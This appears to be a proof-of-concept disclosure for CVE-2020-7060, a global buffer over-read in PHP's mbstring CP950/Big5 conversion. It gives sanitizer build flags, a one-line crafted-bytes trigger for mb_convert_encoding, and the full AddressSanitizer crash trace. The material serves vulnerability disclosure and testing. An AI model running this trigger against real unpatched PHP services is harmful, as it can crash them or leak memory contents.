# CVE-2020-7060

When using certain mbstring functions to convert multibyte encodings, in PHP versions 7.2.x below 7.2.27, 7.3.x below 7.3.14 and 7.4.x below 7.4.2 it is possible to supply data that will cause function mbfl_filt_conv_big5_wchar to read past the allocated buffer. This may lead to information disclosure or crash.

There is an Undefined Behaviour in libmbfl at `mbfl_filt_conv_big5_wchar` function which leads to a buffer overflow on `cp950_pua_tbl` global variable.

## Affected Version

PHP versions 7.2.x below 7.2.27, 7.3.x below 7.3.14 and 7.4.x below 7.4.2

## PoC

Compile with following options.

```shell
CFLAGS="-fPIE -fsanitize=address,undefined -g" LDFLAGS="-pie" ./configure --enable-exif --enable-mbstring
```

```shell
$ ./sapi/cli/php -r 'mb_convert_encoding("\x81\x3a", "UTF-8", "CP950");'
/home/vagrant/php/php-7.4.1/ext/mbstring/libmbfl/filters/mbfilter_big5.c:212:11: runtime error: index 5 out of bounds for type 'unsigned short [5][4]'
SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior /home/vagrant/php/php-7.4.1/ext/mbstring/libmbfl/filters/mbfilter_big5.c:212:11 in
=================================================================
==1962==ERROR: AddressSanitizer: global-buffer-overflow on address 0x000004f821ec at pc 0x00000126273b bp 0x7ffecfe0c280 sp 0x7ffecfe0c278
READ of size 2 at 0x000004f821ec thread T0
    #0 0x126273a in mbfl_filt_conv_big5_wchar /home/vagrant/php/php-7.4.1/ext/mbstring/libmbfl/filters/mbfilter_big5.c:212:11
    #1 0x1378212 in mbfl_buffer_converter_feed2 /home/vagrant/php/php-7.4.1/ext/mbstring/libmbfl/mbfl/mbfilter.c:267:8
    #2 0x1377ae0 in mbfl_buffer_converter_feed /home/vagrant/php/php-7.4.1/ext/mbstring/libmbfl/mbfl/mbfilter.c:244:9
    #3 0x1378ff1 in mbfl_buffer_converter_feed_result /home/vagrant/php/php-7.4.1/ext/mbstring/libmbfl/mbfl/mbfilter.c:331:2
    #4 0x11ccff1 in php_mb_convert_encoding_ex /home/vagrant/php/php-7.4.1/ext/mbstring/mbstring.c:3192:8
    #5 0x11cdc64 in php_mb_convert_encoding /home/vagrant/php/php-7.4.1/ext/mbstring/mbstring.c:3255:9
    #6 0x11d4e41 in zif_mb_convert_encoding /home/vagrant/php/php-7.4.1/ext/mbstring/mbstring.c:3400:9
    #7 0x396af21 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER /home/vagrant/php/php-7.4.1/Zend/zend_vm_execute.h:1268:2
    #8 0x30dbc1e in execute_ex /home/vagrant/php/php-7.4.1/Zend/zend_vm_execute.h:53379:7
    #9 0x30ded56 in zend_execute /home/vagrant/php/php-7.4.1/Zend/zend_vm_execute.h:57664:2
    #10 0x2a533e5 in zend_eval_stringl /home/vagrant/php/php-7.4.1/Zend/zend_execute_API.c:1082:4
    #11 0x2a54ba0 in zend_eval_stringl_ex /home/vagrant/php/php-7.4.1/Zend/zend_execute_API.c:1123:11
    #12 0x2a54d80 in zend_eval_string_ex /home/vagrant/php/php-7.4.1/Zend/zend_execute_API.c:1134:9
    #13 0x3ca319a in do_cli /home/vagrant/php/php-7.4.1/sapi/cli/php_cli.c:992:8
    #14 0x3c9e261 in main /home/vagrant/php/php-7.4.1/sapi/cli/php_cli.c:1352:18
    #15 0x7f6fece6ab96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310
    #16 0x441c79 in _start (/home/vagrant/php/php-7.4.1/sapi/cli/php+0x441c79)

0x000004f821ec is located 4 bytes to the right of global variable 'cp950_pua_tbl' defined in '/home/vagrant/php/php-7.4.1/ext/mbstring/libmbfl/filters/mbfilter_big5.c:137:23' (0x4f821c0) of size 40
SUMMARY: AddressSanitizer: global-buffer-overflow /home/vagrant/php/php-7.4.1/ext/mbstring/libmbfl/filters/mbfilter_big5.c:212:11 in mbfl_filt_conv_big5_wchar
Shadow bytes around the buggy address:
  0x0000809e83e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0000809e83f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0000809e8400: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0000809e8410: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0000809e8420: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0000809e8430: 00 00 00 00 00 00 00 00 00 00 00 00 00[f9]f9 f9
  0x0000809e8440: f9 f9 f9 f9 00 00 00 00 00 00 00 00 00 00 00 00
  0x0000809e8450: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0000809e8460: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0000809e8470: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0000809e8480: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==1962==ABORTING
```
